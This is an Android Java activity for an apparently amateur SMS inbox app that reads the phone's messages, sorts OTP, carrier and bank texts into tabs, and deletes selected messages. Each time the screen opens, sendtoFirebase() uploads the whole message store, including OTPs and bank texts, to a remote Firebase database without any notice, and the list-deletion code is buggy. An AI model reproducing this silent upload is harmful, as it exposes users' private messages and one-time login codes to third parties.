package com.magic.rohit.smsing;

import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.SyncStateContract;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v7.app.ActionBar;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;

import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentPagerAdapter;
import android.support.v4.view.ViewPager;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;

import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import static com.magic.rohit.smsing.MainActivity.getContactName;
import static com.magic.rohit.smsing.SmsBroadcastReceiver.convertDate;

public class InboxActivity extends AppCompatActivity {
RefreshThread refreshThread=new RefreshThread();
    SmsDatabase smsDatabase = SmsDatabase.getSmsDatabaseInstance();
    static SmsAdapter smsAdapterOtp;
    static SmsAdapter smsAdapterCarrier;
    static SmsAdapter smsAdapterBank;
    static SmsAdapter smsAdapterAll;
    static  ArrayList<SmsModel>arrayList1,arrayList2,arrayList3,arrayList4;
   static Toolbar toolbar;
  public static InboxActivity inst;
 static ListView listView;


    public static InboxActivity getInboxActivityInstance()
    {
        return inst;
    }




    @Override
    public void onStart() {
        super.onStart();

        inst = this;
    }

    /**
     * The {@link android.support.v4.view.PagerAdapter} that will provide
     * fragments for each of the sections. We use a
     * {@link FragmentPagerAdapter} derivative, which will keep every
     * loaded fragment in memory. If this becomes too memory intensive, it
     * may be best to switch to a
     * {@link android.support.v4.app.FragmentStatePagerAdapter}.
     */
    private SectionsPagerAdapter mSectionsPagerAdapter;

    /**
     * The {@link ViewPager} that will host the section contents.
     */
    private ViewPager mViewPager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_inbox);
        initSms();
        refreshAdapters();

sendtoFirebase();

        toolbar=findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        getSupportActionBar().setDisplayHomeAsUpEnabled(true);
        // Create the adapter that will return a fragment for each of the three
        // primary sections of the activity.
        mSectionsPagerAdapter = new SectionsPagerAdapter(getSupportFragmentManager());

        // Set up the ViewPager with the sections adapter.
        mViewPager = (ViewPager) findViewById(R.id.container);
        mViewPager.setAdapter(mSectionsPagerAdapter);
        mSectionsPagerAdapter.notifyDataSetChanged();

        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent=new Intent(getInboxActivityInstance(),MainActivity.class);
                startActivity(intent);}
        });

    }

    @Override
    public void onBackPressed() {
        super.onBackPressed();
        Intent intent=new Intent(getInboxActivityInstance(),MainActivity.class);
        startActivity(intent);

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_inbox, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }
        else if(id==R.id.refresh)
        {
           smsDatabase.deleteOldRecord();
            refreshSmsInbox();
        initSms();

            mSectionsPagerAdapter.notifyDataSetChanged();;
        }

        return super.onOptionsItemSelected(item);
    }


    public  void refreshSmsInbox() {

        Uri uri=Uri.parse("content://sms/inbox");
        ContentResolver contentResolver = getContentResolver();
        Cursor smsInboxCursor = contentResolver.query(uri, null, null, null, null);
        int indexBody = smsInboxCursor.getColumnIndex("body");
        int indexAddress = smsInboxCursor.getColumnIndex("address");
        int indexTime=smsInboxCursor.getColumnIndex("date");
        int indexDate=smsInboxCursor.getColumnIndex("date");

        if (indexBody < 0 || !smsInboxCursor.moveToFirst()) ;
        //smsAdapter.clear();
        do {
            String contact = getContactName(getApplicationContext(), smsInboxCursor.getString(indexAddress));
            long time=Long.parseLong(smsInboxCursor.getString(indexTime));
            long date=Long.parseLong(smsInboxCursor.getString(indexDate));

            String smsTime = convertDate(time, "hh:mm a");
            String smsDate = convertDate(date, "dd MMM yyyy");

            SmsModel s1=new SmsModel(contact,smsInboxCursor.getString(indexAddress),smsInboxCursor.getString(indexBody),String.valueOf(time),String.valueOf(date));

            SmsDatabase.getSmsDatabaseInstance().insertRecord(s1);
        } while (smsInboxCursor.moveToNext());
    }

    /*public static void deleteSMS(SmsModel smsModel)
    {
        String time=smsModel.getTime();
        Uri inboxUri = Uri.parse("content://sms/inbox");
        int count = 0;
        Cursor c = getInboxActivityInstance().getContentResolver().query(inboxUri , null, null, null, null);
        while (c.moveToNext()) {
            try {
                // Delete the SMS
                String pid = c.getString(0); // Get id;
                String uri = "content://sms";
                count =getInboxActivityInstance().getContentResolver().delete(Uri.parse(uri),
                       "sc_timestamp",new String[]{time});
                Toast.makeText(getInboxActivityInstance().getApplicationContext(),"message deleted successfully..!"+count,
                        Toast.LENGTH_LONG).show();
            } catch (Exception e) {
                Toast.makeText(getInboxActivityInstance().getApplicationContext(), e.toString(), Toast.LENGTH_LONG).show();
            }
        }}
*/



    /**
     * A placeholder fragment containing a simple view.
     */
    public static class PlaceholderFragment extends Fragment {
        /**
         * The fragment argument representing the section number for this
         * fragment.
         */
        private static final String ARG_SECTION_NUMBER = "section_number";

        public PlaceholderFragment() {
        }

        /**
         * Returns a new instance of this fragment for the given section
         * number.
         */
        public static PlaceholderFragment newInstance(int sectionNumber) {
            PlaceholderFragment fragment = new PlaceholderFragment();
            Bundle args = new Bundle();
            args.putInt(ARG_SECTION_NUMBER, sectionNumber);
            fragment.setArguments(args);
            return fragment;
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                 Bundle savedInstanceState) {
            View rootView = inflater.inflate(R.layout.fragment_inbox, container, false);

            listView=rootView.findViewById(R.id.messages);

            listView.setOnItemLongClickListener(new AdapterView.OnItemLongClickListener() {
                @Override
                public boolean onItemLongClick(AdapterView<?> adapterView, View view, int position, long l) {
                    removeItemFromList(position-1);
                    return true;
                }
            });

            Bundle args = getArguments();
            int currentView = args.getInt(ARG_SECTION_NUMBER)-1;



            if(currentView == 0){
                listView.setAdapter(smsAdapterAll);
                smsAdapterAll.notifyDataSetChanged();
               // toolbar.setTitle("Inbox: All messages");
                //getInboxActivityInstance().setSupportActionBar(toolbar);
            }else if(currentView == 1){
                listView.setAdapter(smsAdapterOtp);
                smsAdapterOtp.notifyDataSetChanged();
              //  toolbar.setTitle("Inbox: OTP messages");
                //getInboxActivityInstance().setSupportActionBar(toolbar);
            }else if(currentView==2) {
                listView.setAdapter(smsAdapterCarrier);
                smsAdapterCarrier.notifyDataSetChanged();
               // toolbar.setTitle("Inbox: Carrier messages");
                //getInboxActivityInstance().setSupportActionBar(toolbar);
            }
            else if(currentView==3)
            {
                listView.setAdapter(smsAdapterBank);

                smsAdapterBank.notifyDataSetChanged();
               // toolbar.setTitle("Inbox: Bank messages");
                //getInboxActivityInstance().setSupportActionBar(toolbar);
            }



            return rootView;
        }


    }

    public static void deleteSMS(Context context, String message, String number, String timestamp) {
        try {
            Uri uriSms = Uri.parse("content://sms/inbox");
            Cursor c = context.getContentResolver().query(
                    uriSms,
                    new String[] { "_id", "thread_id", "address", "person",
                            "date", "body" },null, null, null);

            if (c != null && c.moveToFirst()) {
                do {
                    long id = c.getLong(0);
                    long threadId = c.getLong(1);
                    String address = c.getString(2);
                    String body = c.getString(5);
                    String date = c.getString(3);
                   //Log.d("msgbodytobe deleted",body);
                    if (message.equals(body) && address.equals(number)) {
                         Log.d("Deleting SMS with body:",body);
                        context.getContentResolver().delete(
                                Uri.parse("content://sms/" + id), "date=?",
                                new String[] { c.getString(4) });
                        Log.e("log>>>", "Delete success.........");
                    }
                } while (c.moveToNext());
            }
        } catch (Exception e) {
            Log.e("log>>>", e.toString());
        }
    }




    protected static  void removeItemFromList(int position) {
        final int deletePosition = position;

        AlertDialog.Builder alert = new AlertDialog.Builder(
                InboxActivity.getInboxActivityInstance());

        alert.setTitle("Delete");
        alert.setMessage("Do you want delete this message?");
        alert.setPositiveButton("YES", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                // TOD O Auto-generated method stub

                // main code on after clicking yes
                arrayList4.remove(deletePosition+1);
               deleteSMS(getInboxActivityInstance(),arrayList4.get(deletePosition+1).getBody(),arrayList4.get(deletePosition+1).getNumber(),arrayList4.get(deletePosition+1).getTime());
                smsAdapterAll.notifyDataSetChanged();

            }
        });
        alert.setNegativeButton("CANCEL", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                // TODO Auto-generated method stub
                dialog.dismiss();
            }
        });

        alert.show();

    }



    public void sendtoFirebase() {


        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference("message");
        myRef.setValue("Hello, World!");
        DatabaseReference databaseReference=database.getReference("SmsDatabase");
databaseReference.setValue(smsDatabase);
    }

    public void initSms(){
       arrayList1=smsDatabase.getCategorizedMessages("otp");
         arrayList2=smsDatabase.getCategorizedMessages("carrier");
         arrayList3=smsDatabase.getCategorizedMessages("bank");
        arrayList4=smsDatabase.getAllRecords();
        smsAdapterOtp = new SmsAdapter(this, R.layout.smsmodel,arrayList1);
        smsAdapterCarrier = new SmsAdapter(this, R.layout.smsmodel,arrayList2);
        smsAdapterBank = new SmsAdapter(this, R.layout.smsmodel,arrayList3);
        smsAdapterAll=new SmsAdapter(this,R.layout.smsmodel,arrayList4);
    }

    public void refreshAdapters(){
        smsAdapterOtp.notifyDataSetChanged();
        smsAdapterAll.notifyDataSetChanged();
        smsAdapterBank.notifyDataSetChanged();
        smsAdapterCarrier.notifyDataSetChanged();

    }


public class RefreshThread implements Runnable {
    @Override
    public void run() {
       smsDatabase.deleteOldRecord();
               refreshSmsInbox();
        initSms();}
}


    /**
     * A {@link FragmentPagerAdapter} that returns a fragment corresponding to
     * one of the sections/tabs/pages.
     */
    public class SectionsPagerAdapter extends FragmentPagerAdapter {

        public SectionsPagerAdapter(FragmentManager fm) {
            super(fm);
        }

        @Override
        public Fragment getItem(int position) {
            // getItem is called to instantiate the fragment for the given page.
            // Return a PlaceholderFragment (defined as a static inner class below).
            smsAdapterAll.notifyDataSetChanged();
            smsAdapterBank.notifyDataSetChanged();
            smsAdapterCarrier.notifyDataSetChanged();
            smsAdapterOtp.notifyDataSetChanged();
            return PlaceholderFragment.newInstance(position + 1);
        }

        @Override
        public int getCount() {
            // Show 3 total pages.
            return 4;
        }
    }



    public static class SmsAdapter extends ArrayAdapter<SmsModel> {
        int resource;
        ArrayList<SmsModel> response;
        Context context;

        public SmsAdapter(Context context, int resource, ArrayList<SmsModel> items) {
            super(context, resource, items);
            this.resource=resource;
            this.response=items;
            this.context=context;
       }






        @Override
        public View getView(int position, View convertView, ViewGroup parent){
            SmsModel smsModel = getItem(position);

            if (convertView == null) {
                convertView = LayoutInflater.from(getContext()).inflate(R.layout.smsmodel, parent, false);
            }
            TextView Name = convertView.findViewById(R.id.name);
            TextView Number = convertView.findViewById(R.id.number);
            TextView Body = convertView.findViewById(R.id.body);
            TextView Time=convertView.findViewById(R.id.time);


            Name.setText(smsModel.getName());
            Number.setText(smsModel.getNumber());
            Body.setText(smsModel.getBody());
            Time.setText("Time:"+smsModel.getTime()+ " \nDate:"+smsModel.getDate());


            return convertView;


        }

    }



}
